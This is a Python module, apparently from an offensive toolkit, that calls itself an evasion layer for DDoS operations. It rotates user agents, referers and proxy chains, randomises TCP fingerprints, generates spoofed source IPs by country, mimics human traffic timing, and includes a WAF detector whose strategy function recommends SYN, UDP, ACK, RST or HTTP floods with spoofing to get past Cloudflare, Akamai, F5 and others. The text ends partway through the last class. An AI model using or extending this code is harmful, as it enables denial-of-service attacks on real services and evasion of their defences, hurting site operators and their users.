"""
Expert anonymity, masking, and evasion layer for DDoS operations.
Provides proxy rotation (SOCKS4/5, HTTP), TOR integration, WAF detection,
IP spoofing, request signature randomization, DNS-over-HTTPS, bandwidth
mimicry, and connection fingerprint spoofing.
"""

import asyncio
import base64
import json
import os
import random
import re
import socket
import struct
import subprocess
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

HACKIT_DIR = Path.home() / ".hackit"
HACKIT_DIR.mkdir(parents=True, exist_ok=True)
PROXY_DB = HACKIT_DIR / "proxies.json"


# ── User-Agent Library (200+ real-world agents) ──────────────────────

class RealisticUAGenerator:
    GROUPS = {
        "chrome_win": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        ],
        "chrome_mac": [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        ],
        "chrome_linux": [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ],
        "firefox_win": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
            "Mozilla/5.0 (Windows NT 10.0; rv:115.0) Gecko/20100101 Firefox/115.0",
        ],
        "firefox_mac": [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        ],
        "edge_win": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        ],
        "safari_mac": [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        ],
        "safari_ios": [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        ],
        "android_chrome": [
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Samsung SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Xiaomi 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        ],
        "mobile_others": [
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.105 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
        ],
        "bot_crawler": [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
            "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; +https://duckduckgo.com/duckduckbot)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
            "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
            "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; +http://mj12bot.com/)",
            "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
            "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
        ],
    }

    BROWSER_PROFILES = {
        "chrome": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.9",
            "accept_encoding": "gzip, deflate, br",
        },
        "firefox": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.5",
            "accept_encoding": "gzip, deflate, br",
        },
        "safari": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.9",
            "accept_encoding": "gzip, deflate, br",
        },
        "edge": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.9",
            "accept_encoding": "gzip, deflate, br",
        },
        "mobile": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.9",
            "accept_encoding": "gzip, deflate, br",
        },
        "bot": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.9",
            "accept_encoding": "gzip, deflate",
        },
    }

    def __init__(self):
        self._flat_pool = []
        for agents in self.GROUPS.values():
            self._flat_pool.extend(agents)

    def random(self) -> str:
        return random.choice(self._flat_pool)

    def random_from_group(self, group: str) -> str:
        agents = self.GROUPS.get(group)
        if not agents:
            return self.random()
        return random.choice(agents)

    def profile_for_ua(self, ua: str) -> dict:
        ua_lower = ua.lower()
        if "edg/" in ua_lower:
            profile = self.BROWSER_PROFILES["edge"]
        elif "firefox" in ua_lower and "chrome" not in ua_lower:
            profile = self.BROWSER_PROFILES["firefox"]
        elif "safari" in ua_lower and "chrome" not in ua_lower:
            profile = self.BROWSER_PROFILES["safari"]
        elif "mobile" in ua_lower and "android" in ua_lower:
            profile = self.BROWSER_PROFILES["mobile"]
        elif "bot" in ua_lower or "crawler" in ua_lower or "spider" in ua_lower:
            profile = self.BROWSER_PROFILES["bot"]
        else:
            profile = self.BROWSER_PROFILES["chrome"]
        return {
            "User-Agent": ua,
            "Accept": profile["accept"],
            "Accept-Language": profile["accept_language"],
            "Accept-Encoding": profile["accept_encoding"],
        }

    def random_headers(self) -> dict:
        ua = self.random()
        return self.profile_for_ua(ua)

    def random_referer(self) -> str:
        return random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://search.yahoo.com/",
            "https://www.facebook.com/",
            "https://twitter.com/",
            "https://www.reddit.com/",
            "https://www.linkedin.com/",
            "https://www.duckduckgo.com/",
            "https://t.co/",
            "https://l.facebook.com/",
            "https://www.instagram.com/",
            "https://www.youtube.com/",
            "https://www.amazon.com/",
            "https://www.github.com/",
            "https://stackoverflow.com/",
        ])


# ── DNS over HTTPS Resolver ──────────────────────────────────────────

class DohResolver:
    PROVIDERS = [
        "https://cloudflare-dns.com/dns-query",
        "https://dns.google/dns-query",
        "https://dns.quad9.net/dns-query",
        "https://doh.opendns.com/dns-query",
    ]

    def __init__(self, provider: str = "https://cloudflare-dns.com/dns-query"):
        self.provider = provider
        self.cache: dict[str, str] = {}

    def resolve(self, hostname: str, timeout: int = 5) -> Optional[str]:
        if hostname in self.cache:
            return self.cache[hostname]
        try:
            import urllib.request
            params = base64.urlsafe_b64encode(
                self._build_dns_query(hostname)
            ).rstrip(b"=").decode()
            url = f"{self.provider}?dns={params}"
            req = urllib.request.Request(
                url,
                headers={
                    "Accept": "application/dns-message",
                    "User-Agent": "Mozilla/5.0",
                },
            )
            resp = urllib.request.urlopen(req, timeout=timeout)
            data = resp.read()
            ips = self._parse_dns_response(data)
            if ips:
                self.cache[hostname] = ips[0]
                return ips[0]
        except Exception:
            pass
        return None

    def resolve_with_fallback(self, hostname: str) -> Optional[str]:
        for provider in self.PROVIDERS:
            self.provider = provider
            result = self.resolve(hostname)
            if result:
                return result
        return None

    @staticmethod
    def _build_dns_query(hostname: str) -> bytes:
        tid = random.randint(0, 0xFFFF)
        header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
        body = b""
        for part in hostname.split("."):
            body += bytes([len(part)]) + part.encode()
        body += b"\x00"
        body += struct.pack("!HH", 1, 1)
        return header + body

    @staticmethod
    def _parse_dns_response(data: bytes) -> list[str]:
        ips = []
        try:
            header = data[:12]
            qdcount = struct.unpack("!H", header[4:6])[0]
            ancount = struct.unpack("!H", header[6:8])[0]
            offset = 12
            for _ in range(qdcount):
                while offset < len(data) and data[offset] != 0:
                    offset += 1
                offset += 5
            for _ in range(ancount):
                if offset + 10 > len(data):
                    break
                if data[offset] & 0xC0 == 0xC0:
                    offset += 2
                else:
                    while offset < len(data) and data[offset] != 0:
                        offset += 1
                    offset += 1
                rtype, rclass = struct.unpack("!HH", data[offset:offset+4])
                offset += 4
                ttl, rdlength = struct.unpack("!IH", data[offset:offset+6])
                offset += 6
                if rtype == 1 and rdlength == 4:
                    ip = ".".join(str(b) for b in data[offset:offset+4])
                    ips.append(ip)
                offset += rdlength
        except Exception:
            pass
        return ips


# ── Proxy Data Class ─────────────────────────────────────────────────

@dataclass
class Proxy:
    url: str
    protocol: str = "socks5"
    country: str = ""
    speed: float = 0.0
    reliability: float = 1.0
    last_used: float = 0.0
    failures: int = 0
    successes: int = 0
    source: str = "manual"

    @property
    def score(self) -> float:
        if self.speed <= 0:
            return 0
        return self.reliability * 1000.0 / max(self.speed, 0.1)

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "protocol": self.protocol,
            "country": self.country,
            "speed": self.speed,
            "reliability": self.reliability,
            "failures": self.failures,
            "successes": self.successes,
            "source": self.source,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "Proxy":
        p = cls(
            url=d["url"],
            protocol=d.get("protocol", "socks5"),
            country=d.get("country", ""),
            speed=d.get("speed", 0),
            reliability=d.get("reliability", 1.0),
            source=d.get("source", "manual"),
        )
        p.failures = d.get("failures", 0)
        p.successes = d.get("successes", 0)
        return p


# ── Proxy Chain ──────────────────────────────────────────────────────

@dataclass
class ProxyChain:
    hops: list[Proxy] = field(default_factory=list)

    def add_hop(self, proxy: Proxy):
        self.hops.append(proxy)

    def remove_hop(self, index: int):
        if 0 <= index < len(self.hops):
            self.hops.pop(index)

    def clear(self):
        self.hops.clear()

    @property
    def is_empty(self) -> bool:
        return len(self.hops) == 0

    def to_dict(self) -> list[dict]:
        return [hop.to_dict() for hop in self.hops]

    @classmethod
    def from_dict(cls, data: list[dict]) -> "ProxyChain":
        chain = cls()
        for d in data:
            chain.hops.append(Proxy.from_dict(d))
        return chain

    def __str__(self) -> str:
        if not self.hops:
            return "(direct)"
        return " -> ".join(f"{h.protocol}://{h.url.split('@')[-1]}" for h in self.hops)


# ── Request Signer (TCP/IP fingerprint randomizer) ───────────────────

class RequestSigner:
    OS_SIGNATURES = {
        "linux": {"window": 65535, "ttl": 64, "mss": 1460, "wscale": 7},
        "windows": {"window": 8192, "ttl": 128, "mss": 1460, "wscale": 8},
        "macos": {"window": 14600, "ttl": 64, "mss": 1460, "wscale": 3},
        "freebsd": {"window": 65535, "ttl": 64, "mss": 1460, "wscale": 7},
        "openbsd": {"window": 16384, "ttl": 64, "mss": 1460, "wscale": 0},
        "solaris": {"window": 65535, "ttl": 255, "mss": 1460, "wscale": 2},
        "android": {"window": 65535, "ttl": 64, "mss": 1440, "wscale": 7},
        "ios": {"window": 65535, "ttl": 64, "mss": 1460, "wscale": 3},
    }

    TCP_OPTIONS_ORDER = {
        "linux": ["mss", "wscale", "sackOK", "timestamps"],
        "windows": ["mss", "wscale", "sackOK", "timestamps"],
        "macos": ["mss", "wscale", "sackOK", "timestamps"],
        "freebsd": ["mss", "wscale", "timestamps", "sackOK"],
    }

    def __init__(self, os_override: Optional[str] = None):
        self.os_override = os_override

    def pick_os(self) -> str:
        if self.os_override:
            return self.os_override
        return random.choice(list(self.OS_SIGNATURES.keys()))

    def randomize_window(self, os_name: str) -> int:
        sig = self.OS_SIGNATURES.get(os_name, self.OS_SIGNATURES["linux"])
        base = sig["window"]
        jitter = random.randint(-512, 512)
        return max(256, base + jitter)

    def randomize_ttl(self, os_name: Optional[str] = None) -> int:
        if os_name:
            sig = self.OS_SIGNATURES.get(os_name, self.OS_SIGNATURES["linux"])
            base = sig["ttl"]
        else:
            base = random.choice([64, 128, 255])
        jitter = random.randint(-3, 3)
        return max(1, min(255, base + jitter))

    def randomize_mss(self, os_name: str) -> int:
        sig = self.OS_SIGNATURES.get(os_name, self.OS_SIGNATURES["linux"])
        base = sig["mss"]
        alt = [1460, 1440, 1452, 1360, 1464, 1412]
        if random.random() < 0.3:
            return random.choice(alt)
        return base + random.randint(-4, 4)

    def randomize_tcp_options_order(self, os_name: str) -> list[str]:
        order = self.TCP_OPTIONS_ORDER.get(os_name, self.TCP_OPTIONS_ORDER["linux"])
        if random.random() < 0.15:
            shuffled = list(order)
            random.shuffle(shuffled)
            return shuffled
        return list(order)

    def randomize_tcp_timestamp(self) -> int:
        return random.randint(100000, 4294967295)

    def build_tcp_syn_fingerprint(self) -> dict:
        os_name = self.pick_os()
        return {
            "os": os_name,
            "ttl": self.randomize_ttl(os_name),
            "window": self.randomize_window(os_name),
            "mss": self.randomize_mss(os_name),
            "options_order": self.randomize_tcp_options_order(os_name),
            "timestamp": self.randomize_tcp_timestamp(),
            "sackOK": 1,
            "wscale": self.OS_SIGNATURES.get(os_name, self.OS_SIGNATURES["linux"])["wscale"],
        }

    def randomize(self) -> dict:
        return self.build_tcp_syn_fingerprint()


# ── WAF Detector ─────────────────────────────────────────────────────

class WAFDetector:
    WAF_SIGNATURES = {
        "Cloudflare": {
            "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
            "cookies": ["__cfduid", "__cf_bm"],
            "body": ["attention required!", "cloudflare", "checking your browser",
                     "ddos protection by cloudflare", "please enable cookies"],
            "server": ["cloudflare"],
        },
        "Akamai": {
            "headers": ["x-akamai-transformed", "x-akamai-request-id"],
            "cookies": ["ak_bmsc", "bm_sz", "bm_mi"],
            "body": ["akamai", "reference number:"],
            "server": ["akamai", "akamaighost"],
        },
        "Imperva/Incapsula": {
            "headers": ["x-cdn", "x-iinfo"],
            "cookies": ["visid_incap", "incap_ses", "nlbi_"],
            "body": ["incapsula", "imperva", "blocked because we believe",
                     "please contact the site owner"],
            "server": ["imperva", "incapsula"],
        },
        "AWS WAF": {
            "headers": ["x-amzn-requestid", "x-amzn-waf-action", "x-amzn-trace-id"],
            "cookies": ["aws-waf-token"],
            "body": ["request blocked", "awswaf", "amazon web services",
                     "what happened?"],
            "server": ["cloudfront"],
        },
        "ModSecurity": {
            "headers": [],
            "cookies": [],
            "body": ["mod_security", "modsecurity", "not acceptable",
                     "406 not acceptable", "access denied by rules",
                     "error code: 406"],
            "server": ["apache"],
        },
        "Sucuri": {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "cookies": ["sucuri_cloudproxy"],
            "body": ["sucuri", "sucuri web firewall", "access denied",
                     "website firewall"],
            "server": ["sucuri"],
        },
        "F5 BIG-IP": {
            "headers": ["x-f5-auth", "x-wa-info"],
            "cookies": ["f5-full-waf-mode", "f5_cert"],
            "body": ["big-ip", "the requested url was rejected",
                     "f5 networks", "support id:"],
            "server": ["big-ip", "f5"],
        },
        "Barracuda": {
            "headers": ["x-barracuda-waf"],
            "cookies": ["barra_counter_session"],
            "body": ["barracuda", "blocked by barracuda",
                     "barracuda web firewall"],
            "server": ["barracuda"],
        },
        "Fortinet": {
            "headers": ["x-infinity-access"],
            "cookies": [],
            "body": ["fortiwaf", "fortiguard", "fortinet", "blocked by fortigate",
                     "web filter blocked"],
            "server": ["fortiweb", "fortiguard"],
        },
        "Radware": {
            "headers": ["x-rdwr"],
            "cookies": ["radware", "alt_ccks"],
            "body": ["radware", "waf", "appwall", "blocked by radware"],
            "server": ["radware"],
        },
        "AQTRONIX": {
            "headers": ["x-atn"],
            "cookies": [],
            "body": ["aqtronix", "blocked by aqtronix"],
            "server": [],
        },
        "Comodo": {
            "headers": ["x-comodo"],
            "cookies": ["comodo"],
            "body": ["comodo cwaf", "protected by comodo"],
            "server": ["comodo"],
        },
        "Sophos": {
            "headers": ["x-sophos"],
            "cookies": [],
            "body": ["sophos", "blocked by sophos", "sophos utm"],
            "server": ["sophos"],
        },
        "StackPath": {
            "headers": ["x-sp-cache"],
            "cookies": [],
            "body": ["stackpath", "protected by stackpath"],
            "server": ["stackpath"],
        },
        "Varnish": {
            "headers": ["x-varnish"],
            "cookies": [],
            "body": [],
            "server": ["varnish"],
        },
        "Wordfence": {
            "headers": [],
            "cookies": ["wfvt"],
            "body": ["wordfence", "blocked by wordfence",
                     "generated by wordfence"],
            "server": [],
        },
    }

    def detect(self, headers: dict, body: str, server: str = "") -> list[str]:
        detected = []
        headers_lower = {k.lower(): str(v).lower() for k, v in headers.items()}
        body_lower = body.lower() if body else ""
        for waf_name, sigs in self.WAF_SIGNATURES.items():
            found = False
            for h in sigs["headers"]:
                if h.lower() in headers_lower:
                    found = True
                    break
            if not found:
                for c in sigs["cookies"]:
                    for header_val in headers_lower.values():
                        if c.lower() in header_val:
                            found = True
                            break
                    if found:
                        break
            if not found:
                for b in sigs["body"]:
                    if b in body_lower:
                        found = True
                        break
            if not found:
                for s in sigs["server"]:
                    if s in server.lower():
                        found = True
                        break
            if found:
                detected.append(waf_name)
        return list(set(detected))

    def suggest_strategy(self, waf_names: list[str]) -> dict:
        if not waf_names:
            return {
                "method": "syn",
                "spoof": True,
                "jitter": 0,
                "note": "No WAF detected — standard SYN flood",
            }
        waf_lower = [w.lower() for w in waf_names]
        strategies = {
            "cloudflare": {
                "method": "syn",
                "spoof": True,
                "jitter": 500,
                "note": "Cloudflare detected — SYN flood with IP rotation",
            },
            "akamai": {
                "method": "udp",
                "spoof": True,
                "jitter": 300,
                "note": "Akamai detected — UDP flood with randomized headers",
            },
            "f5 big-ip": {
                "method": "ack",
                "spoof": True,
                "jitter": 200,
                "note": "F5 BIG-IP detected — ACK flood recommended",
            },
            "modsecurity": {
                "method": "rst",
                "spoof": True,
                "jitter": 100,
                "note": "ModSecurity detected — RST flood bypass",
            },
            "imperva/incapsula": {
                "method": "http",
                "spoof": True,
                "jitter": 400,
                "note": "Imperva detected — HTTP flood with proxy rotation",
            },
        }
        for waf in waf_lower:
            for key, strategy in strategies.items():
                if key in waf:
                    return strategy
        return {
            "method": "syn",
            "spoof": True,
            "jitter": 300,
            "note": f"WAF detected ({', '.join(waf_names)}) — SYN flood recommended",
        }


# ── Bandwidth Mimic ──────────────────────────────────────────────────

class BandwidthMimic:
    def __init__(self):
        self.on_period = (0.5, 3.0)
        self.off_period = (0.1, 1.5)
        self.state = "off"
        self.state_until = 0.0
        self.lock = threading.Lock()

    def think_time(self) -> float:
        return random.uniform(0.05, 0.8)

    def next_request_interval(self) -> float:
        with self.lock:
            now = time.time()
            if now >= self.state_until:
                if self.state == "off":
                    self.state = "on"
                    self.state_until = now + random.uniform(*self.on_period)
                    interval = random.uniform(0.01, 0.05)
                else:
                    self.state = "off"
                    self.state_until = now + random.uniform(*self.off_period)
                    interval = self.think_time()
            else:
                if self.state == "on":
                    interval = random.uniform(0.01, 0.08)
                else:
                    interval = self.think_time()
            return interval

    def should_send(self) -> bool:
        return self.state == "on"

    def reset(self):
        with self.lock:
            self.state = "off"
            self.state_until = time.time() + random.uniform(*self.off_period)


# ── IP Spoof Pool Generator ──────────────────────────────────────────

class SpoofIPGenerator:
    BOGON_PREFIXES = [
        "0.", "127.", "255.255.255.",
        "192.0.2.", "198.51.100.", "203.0.113.",
    ]

    PUBLIC_CIDRS: list[tuple[str, int]] = [
        ("1.%d.%d.%d", 3),
        ("8.%d.%d.%d", 3),
        ("23.%d.%d.%d", 3),
        ("34.%d.%d.%d", 3),
        ("45.%d.%d.%d", 3),
        ("54.%d.%d.%d", 3),
        ("64.%d.%d.%d", 3),
        ("72.%d.%d.%d", 3),
        ("91.%d.%d.%d", 3),
        ("104.%d.%d.%d", 3),
        ("128.%d.%d.%d", 3),
        ("141.%d.%d.%d", 3),
        ("151.%d.%d.%d", 3),
        ("172.%d.%d.%d", 3),
        ("172.16.%d.%d", 2),
        ("185.%d.%d.%d", 3),
        ("192.%d.%d.%d", 3),
        ("192.168.%d.%d", 2),
        ("198.%d.%d.%d", 3),
        ("203.%d.%d.%d", 3),
        ("216.%d.%d.%d", 3),
    ]

    COUNTRY_IPS = {
        "US": [
            ("3.%d.%d.%d", 3), ("4.%d.%d.%d", 3), ("13.%d.%d.%d", 3),
            ("18.%d.%d.%d", 3), ("35.%d.%d.%d", 3), ("44.%d.%d.%d", 3),
            ("50.%d.%d.%d", 3), ("52.%d.%d.%d", 3), ("54.%d.%d.%d", 3),
        ],
        "NL": [
            ("2.%d.%d.%d", 3), ("5.%d.%d.%d", 3), ("31.%d.%d.%d", 3),
            ("37.%d.%d.%d", 3), ("62.%d.%d.%d", 3), ("77.%d.%d.%d", 3),
        ],
        "DE": [
            ("3.%d.%d.%d", 3), ("46.%d.%d.%d", 3), ("62.%d.%d.%d", 3),
            ("78.%d.%d.%d", 3), ("79.%d.%d.%d", 3), ("80.%d.%d.%d", 3),
        ],
        "SG": [
            ("8.%d.%d.%d", 3), ("23.%d.%d.%d", 3), ("43.%d.%d.%d", 3),
            ("52.%d.%d.%d", 3), ("54.%d.%d.%d", 3), ("101.%d.%d.%d", 3),
        ],
        "JP": [
            ("1.%d.%d.%d", 3), ("14.%d.%d.%d", 3), ("27.%d.%d.%d", 3),
            ("36.%d.%d.%d", 3), ("43.%d.%d.%d", 3), ("45.%d.%d.%d", 3),
        ],
        "BR": [
            ("18.%d.%d.%d", 3), ("34.%d.%d.%d", 3), ("45.%d.%d.%d", 3),
            ("138.%d.%d.%d", 3), ("143.%d.%d.%d", 3), ("152.%d.%d.%d", 3),
        ],
        "GB": [
            ("3.%d.%d.%d", 3), ("5.%d.%d.%d", 3), ("18.%d.%d.%d", 3),
            ("31.%d.%d.%d", 3), ("35.%d.%d.%d", 3), ("52.%d.%d.%d", 3),
        ],
        "IN": [
            ("1.%d.%d.%d", 3), ("14.%d.%d.%d", 3), ("27.%d.%d.%d", 3),
            ("45.%d.%d.%d", 3), ("49.%d.%d.%d", 3), ("103.%d.%d.%d", 3),
        ],
        "RU": [
            ("5.%d.%d.%d", 3), ("31.%d.%d.%d", 3), ("37.%d.%d.%d", 3),
            ("46.%d.%d.%d", 3), ("62.%d.%d.%d", 3), ("77.%d.%d.%d", 3),
        ],
        "CA": [
            ("15.%d.%d.%d", 3), ("23.%d.%d.%d", 3), ("45.%d.%d.%d", 3),
            ("52.%d.%d.%d", 3), ("64.%d.%d.%d", 3), ("70.%d.%d.%d", 3),
        ],
    }

    def __init__(self):
        self.generated: set = set()

    def _is_bogon(self, ip: str) -> bool:
        for b in self.BOGON_PREFIXES:
            if ip.startswith(b):
                return True
        try:
            parts = [int(x) for x in ip.split(".")]
            if parts[0] == 10:
                return True
            if parts[0] == 172 and 16 <= parts[1] <= 31:
                return True
            if parts[0] == 192 and parts[1] == 168:
                return True
            if parts[0] == 100 and 64 <= parts[1] <= 127:
                return True
            if parts[0] == 169 and parts[1] == 254:
                return True
            if parts[0] == 198 and parts[1] == 18:
                return True
        except (ValueError, IndexError):
            return True
        return False

    def random_ip(self, country: Optional[str] = None) -> str:
        if country and country in self.COUNTRY_IPS:
            cidrs = self.COUNTRY_IPS[country]
        else:
            cidrs = self.PUBLIC_CIDRS
        for _ in range(100):
            pattern, parts = random.choice(cidrs)
            args = tuple(random.randint(1, 254) for _ in range(parts))
            ip = pattern % args[:parts]
            if not self._is_bogon(ip):
                return ip
        return "8.8.8." + str(random.randint(1, 254))

    def generate_pool(self, count: int = 100, country: Optional[str] = None) -> list[str]:
        pool = set()
        attempts = 0
        while len(pool) < count and attempts < count * 10:
            ip = self.random_ip(country)
            pool.add(ip)
            attempts += 1
        self.generated = pool
        return list(pool)


# ── Connection Fingerprint Randomizer ────────────────────────────────

class ConnectionFingerprintRandomizer:
    WINDOW_SIZES = {
        "linux": 65535,
        "windows": 8192,
        "macos": 14600,
        "freebsd": 65535,
        "solaris": 65535,
    }

